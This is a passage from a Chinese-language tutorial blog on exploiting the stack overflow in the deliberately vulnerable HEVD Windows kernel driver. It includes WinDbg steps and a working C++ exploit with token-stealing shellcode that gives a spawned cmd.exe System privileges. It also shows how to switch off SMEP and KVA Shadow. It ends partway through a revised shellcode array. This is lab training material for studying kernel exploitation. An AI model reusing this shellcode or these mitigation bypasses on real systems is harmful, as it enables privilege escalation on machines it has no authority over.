class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/7874f17a8d4d02206828dc53d3cab9ac.png" alt="image-20240117202959678" /></p><p><img src="https://img.joe1sn.top/uploads/big/b65a46ebcb5df65ffc94318470bfc834.png" alt="image-20240117211228964" /></p><h2 id="d-开始调试"><a class="markdownIt-Anchor" href="#d-开始调试"></a> D. 开始调试</h2><p>之前符号表好像没加载上，在windbg中，HEVD的描述符一般在同级文件夹下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sympath+ &lt;pdb文件物理机上的路径&gt;</span><br></pre></td></tr></table></figure><p>然后再</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lm m HEVD</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ec3aa1ca49a1c562e3f258276569051c.png" alt="image-20240117224344703" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x /D /f HEVD!*</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/e1effb52c7e61dbd37dec5d4ae999c44.png" alt="image-20240117224429242" /></p><p>下个断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp HEVD!TriggerBufferOverflowStack</span><br></pre></td></tr></table></figure><p>这里运行下不崩溃的</p><p><img src="https://img.joe1sn.top/uploads/big/f006a81272655c32bcadac39d047e344.png" alt="image-20240117224828729" /></p><h3 id="i-windbg-调试常用"><a class="markdownIt-Anchor" href="#i-windbg-调试常用"></a> I. Windbg 调试常用</h3><p>在使用Windbg调试内核驱动程序时，你可以使用以下命令查看内存地址：</p><ul><li><p>64位查看内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dq &lt;内存地址&gt; L &lt;要查看的长度，长度是64位为一组&gt;</span><br></pre></td></tr></table></figure></li><li><p>64位查看内存，单列显示，这在查看栈的情况是比较好用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dqs &lt;内存地址&gt; L &lt;要查看的长度，长度是64位为一组&gt;</span><br></pre></td></tr></table></figure></li><li><p>在某处添加断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp &lt;内存虚拟地址&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bp &lt;模块名&gt;!&lt;函数名&gt;</span><br><span class="line">//bp: break point 如 bp HEVD!TriggerBufferOverflowStack</span><br></pre></td></tr></table></figure></li><li><p>查看所有断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bl</span><br></pre></td></tr></table></figure></li><li><p>快速反汇编，适合查看gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u &lt;内存地址&gt;</span><br></pre></td></tr></table></figure></li><li><p>反汇编该地址对应的一段汇编，适合反汇编这段函数后选择断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uf &lt;内存地址&gt;</span><br><span class="line">uf &lt;模块名&gt;!&lt;函数名&gt;</span><br></pre></td></tr></table></figure></li><li><p>计算器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? &lt;计算表达式&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="ii-内存布局"><a class="markdownIt-Anchor" href="#ii-内存布局"></a> II. 内存布局</h3><p><img src="https://img.joe1sn.top/uploads/big/da9b01520c9211cd93d3d115e7038832.png" alt="image-20240117225628917" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x80</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, size, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl, </span><br><span class="line">stackspace, size, </span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果引发溢出的话，看看kernel中的<code>v5</code>变量的布局</p><p><img src="https://img.joe1sn.top/uploads/big/533fe5848e91b5a10810b49521a1b4c0.png" alt="image-20240117231239916" /></p><p><img src="https://img.joe1sn.top/uploads/big/3f6b619a89d60563919834ae5442e701.png" alt="image-20240117231345354" /></p><p>这里的kernelBuffer就相当于用户模式下的“栈帧”</p><p>同时可以看到我们程序的内存</p><p><img src="https://img.joe1sn.top/uploads/big/fcfe15fb3b2fec30ee5ef6c8baf8a314.png" alt="image-20240117235653641" /></p><p><img src="https://img.joe1sn.top/uploads/big/28848667498b38b1a820bac1838ba971.png" alt="image-20240117235638456" /></p><p>这个时候顺便看一下rbp</p><p><img src="https://img.joe1sn.top/uploads/big/dcdee888e276aed122855f092a922429.png" alt="image-20240117231511587" /></p><p>在<code>pop</code>前下断点再运行到</p><p><img src="https://img.joe1sn.top/uploads/big/1a869ecdf8003008e6c2a871f2a17c02.png" alt="image-20240117234330859" /></p><p>所以是rsp+0x20+0x818就得到ret的地址</p><p>很明显这里可以通过栈溢出劫持返回地址，然后实现我们的shellcode</p><h3 id="iii-布置构思"><a class="markdownIt-Anchor" href="#iii-布置构思"></a> III. 布置构思</h3><ul><li>首先 <strong>驱动是64位</strong>，所以要用64位的思维去布局</li><li>其次，驱动和我们的程序内存之间是能访问的，所以我们在Ring3写shellcode，然后覆盖到Ring0去执行</li></ul><p>那么就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;a&quot;</span>*<span class="number">0x810</span>+p64(shellcode_addr)</span><br></pre></td></tr></table></figure><h1 id="shellcodeexp编写"><a class="markdownIt-Anchor" href="#shellcodeexp编写"></a> Shellcode+exp编写</h1><h2 id="a-shellcode"><a class="markdownIt-Anchor" href="#a-shellcode"></a> A. shellcode</h2><p>主要是用这篇：<a href="https://blog.xpnsec.com/hevd-stack-overflow/">Exploiting Windows 10 Kernel Drivers - Stack Overflow</a> 或者里面参考的两篇</p><p>主要目的就是拿去Token然后替换掉一个cmd.exe的Token实现提权，<strong>在下一篇文章中会详细提到</strong></p><blockquote><p>This time around we will pass the PID into the shellcode, which means that our tweaked shellcode will look like this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">[BITS 64]</span><br><span class="line"></span><br><span class="line">push rax</span><br><span class="line">push rbx</span><br><span class="line">push rcx</span><br><span class="line">push rsi</span><br><span class="line">push rdi</span><br><span class="line"></span><br><span class="line">mov rax, [gs:0x180 + 0x8]   ; Get &#x27;CurrentThread&#x27; from KPRCB</span><br><span class="line"></span><br><span class="line">mov rax, [rax + 0x220]       ; Get &#x27;Process&#x27; property from current thread</span><br><span class="line"></span><br><span class="line">next_process:</span><br><span class="line">cmp dword [rax + 0x2e0], 0x41414141  ; Search for &#x27;cmd.exe&#x27; process (&#x27;AAAA&#x27; replaced by exploit)</span><br><span class="line">je found_cmd_process</span><br><span class="line">mov rax, [rax + 0x2e8]            ; If not found, go to next process</span><br><span class="line">sub rax, 0x2e8</span><br><span class="line">jmp next_process</span><br><span class="line"></span><br><span class="line">found_cmd_process:</span><br><span class="line">mov rbx, rax                     ; Save our cmd.exe EPROCESS for later</span><br><span class="line"></span><br><span class="line">find_system_process:</span><br><span class="line">cmp dword [rax + 0x2e0], 0x00000004  ; Search for PID 4 (System process)</span><br><span class="line">je found_system_process</span><br><span class="line">mov rax, [rax + 0x2e8]</span><br><span class="line">sub rax, 0x2e8</span><br><span class="line">jmp find_system_process</span><br><span class="line"></span><br><span class="line">found_system_process:</span><br><span class="line">mov rcx, [rax + 0x358]            ; Take TOKEN from System process</span><br><span class="line">mov [rbx+0x358], rcx              ; And copy it to the cmd.exe process</span><br><span class="line"></span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br><span class="line">pop rcx</span><br><span class="line">pop rbx</span><br><span class="line">pop rax</span><br><span class="line"></span><br><span class="line">; return goes here</span><br></pre></td></tr></table></figure></blockquote><h2 id="b-exp"><a class="markdownIt-Anchor" href="#b-exp"></a> B. EXP</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> shellcode[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x53</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x20</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x81</span>, <span class="number">0xb8</span>, <span class="number">0xe0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x41</span>,</span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x74</span>, <span class="number">0x0f</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xe8</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x2d</span>, <span class="number">0xe8</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xeb</span>, <span class="number">0xe5</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line"><span class="number">0xc3</span>, <span class="number">0x83</span>, <span class="number">0xb8</span>, <span class="number">0xe0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x74</span>, <span class="number">0x0f</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xe8</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x2d</span>, <span class="number">0xe8</span>,</span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xeb</span>, <span class="number">0xe8</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x88</span>, <span class="number">0x58</span>, <span class="number">0x03</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5f</span>,</span><br><span class="line"><span class="number">0x5e</span>, <span class="number">0x59</span>, <span class="number">0x5b</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc4</span>, <span class="number">0x28</span>, <span class="number">0xc3</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DWORD oldProtect;</span><br><span class="line">STARTUPINFOA si;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x820</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x810</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode;</span><br><span class="line"></span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(shellcode, <span class="number">256</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line">si.cb = <span class="built_in">sizeof</span>(STARTUPINFOA);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">true</span>, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] FATAL: Error spawning cmd.exe\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Updating our shellcode to search for PID %d\n&quot;</span>, pi.dwProcessId);</span><br><span class="line">*(DWORD*)((<span class="type">char</span>*)shellcode + <span class="number">27</span>) = pi.dwProcessId;</span><br><span class="line"></span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">stackspace, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/b79e4ef722ad8e26cab88c67a5224aa1.png" alt="image-20240118002020265" /></p><p>然后到ret返回，查看返回地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/4c65cdde199c60120b262e70f5635485.png" alt="image-20240118002154225" /></p><p>发现返回地地址已经被覆盖了，继续走下去</p><p><img src="https://img.joe1sn.top/uploads/big/4d009e4de60cbc5e00a14daaee7b7ab1.png" alt="image-20240118002325326" /></p><p>跳转到了shellcode了，再走两步</p><p><img src="https://img.joe1sn.top/uploads/big/777b9bff2c6634898c68adf02ca19a72.png" alt="image-20240118002504625" /></p><p>？？？</p><p><img src="https://img.joe1sn.top/uploads/big/1ab88b491fdcf9a1627f14b8a708a8ed.png" alt="image-20240118002613223" /></p><p><img src="https://img.joe1sn.top/uploads/big/b1b94aa13dbf421338b2bf2ac25a1827.png" alt="image-20240118003040168" /></p><p>说我在执行不可执行的内存，但是明明已经<code>VirtualProtect(shellcode, 256, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</code></p><p>？？？越来越离谱了</p><p>尝试把shellcode移动到常量内存中试试，还是不行，接着我再进行ioctl之前pause一下，好像可以了</p><p><img src="https://img.joe1sn.top/uploads/big/a1b311e4b3eef101d2e0a98327149622.png" alt="image-20240118013041535" /></p><p>但是依然被说执行不可执行代码</p><h1 id="新的保护机制"><a class="markdownIt-Anchor" href="#新的保护机制"></a> 新的保护机制</h1><p>查了<a href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/#">其他的解法</a>，发现Windows 8过后微软添加了一个叫做SMEP保护的东西</p><p>你可以在这里查到关于Windows的所有保护机制：<a href="https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10">https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10</a></p><blockquote><ul><li><strong>监督器模式执行防护 (SMEP)</strong> ：帮助防止内核 (“监督器”) 在用户页面中执行代码，这是攻击者用于本地内核提升特权 (EOP) 的常见技术。 此配置需要在 Intel Ivy Bridge 或更高版本处理器中找到处理器支持，或者具有 PXN 支持的 ARM。</li></ul></blockquote><p>尝试关闭该保护后执行exp，<strong>但是发现是无法关闭的</strong>，由于内核的整体设计导致该保护在windows8及以上是不能被关闭的，那么就只能想办法绕过了</p><h2 id="a-smep保护机制及手动绕过"><a class="markdownIt-Anchor" href="#a-smep保护机制及手动绕过"></a> A. SMEP保护机制及手动绕过</h2><p>该保护机制强烈依赖于CPU的<code>RC4</code>寄存器，刚好我这里有《英特尔® 64 位和 IA-32 架构开发人员手册合订本》，翻出来看一下</p><p><img src="https://img.joe1sn.top/uploads/big/8dceeeeaf9a0251f0b359cf99c2c1099.png" alt="image-20240118103701065" /></p><blockquote><p>[机翻]从用户模式地址获取指令。<br />访问权限取决于 CR4.SMEP 的值：<br />• 如果CR4.SMEP = 0，访问权限取决于分页模式和IA32_EFER.NXE 的值：<br />— 对于 32 位分页或如果 IA32_EFER.NXE = 0，则可以从任何用户模式获取指令<br />地址。<br />— 对于 IA32_EFER.NXE = 1 的其他分页模式，可以通过每个分页结构条目中 XD 标志为 0 的转换从任何用户模式地址获取指令<br />控制翻译； 指令可能无法从任何用户模式地址获取<br />在任何控制转换的分页结构条目中 XD 标志为 1 的转换。<br />• 如果CR4.SMEP = 1，则不能从任何用户模式地址获取指令。<br />— 仅允许对管理员模式影子堆栈地址进行管理员模式影子堆栈访问<br />（往上看）。</p></blockquote><p>或许我们将<code>CR4.SMEP</code>的值设置为<code>0</code>，访问权限由页中的U/S标志位决定</p><p>CR4寄存器的结构如下（小端序顺序从右向左）：</p><p><img src="https://img.joe1sn.top/uploads/big/f39ac47992f037a218a801528db29eb5.png" alt="image-20240118105721560" /></p><p>不急，继续搜索发现了一份Intel关于SMEP的更详细的描述</p><p>文档：<a href="https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf">https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf</a></p><p>尝试使用调试起修改CR4</p><p><img src="https://img.joe1sn.top/uploads/big/ad5cf6efe1bb2811438dd79964396658.png" alt="image-20240118110623235" /></p><p>如果修改第20位为0，rc的值为<code>0x270678</code>，然而还是不行</p><p><img src="https://img.joe1sn.top/uploads/big/358725a8cb68d78d4f738d38b49e1997.png" alt="image-20240118131258807" /></p><h2 id="b-kvas"><a class="markdownIt-Anchor" href="#b-kvas"></a> B. KVAS</h2><p>Windows内核缓解机制使用了Kva Shadow内存，比如MeltDown漏洞就于此有关，首先不会讲细节，<strong>在下一篇文章会讲到</strong>，尝试将其关闭</p><p>再注册表<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management</code></p><p>创建两个DWORD值：<code>FeatureSettingsOverride </code>  <code>FeatureSettingsOverrideMask</code></p><p>设置值为3，然后重启</p><p><img src="https://img.joe1sn.top/uploads/big/cb9c56124685a1418f578b2fefd2f119.png" alt="image-20240118140220468" /></p><p>现在手动设置cr4.SMEP为0</p><p><img src="https://img.joe1sn.top/uploads/big/c5e4751baecdd52edb64fef20d4d2fb2.png" alt="image-20240118141040651" /></p><p>终于运行了</p><p><img src="https://img.joe1sn.top/uploads/big/75325e60ebda69029a1a5f2fcf81358e.png" alt="image-20240118141139354" /></p><p>shellcode的一些偏移有问题</p><p><img src="https://img.joe1sn.top/uploads/big/0bd6d7a7b9886ec9c78440be9a38dff5.png" alt="image-20240118142143111" /></p><p>更换为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">BYTE cmd[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line"><span class="number">0xc1</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>, <span 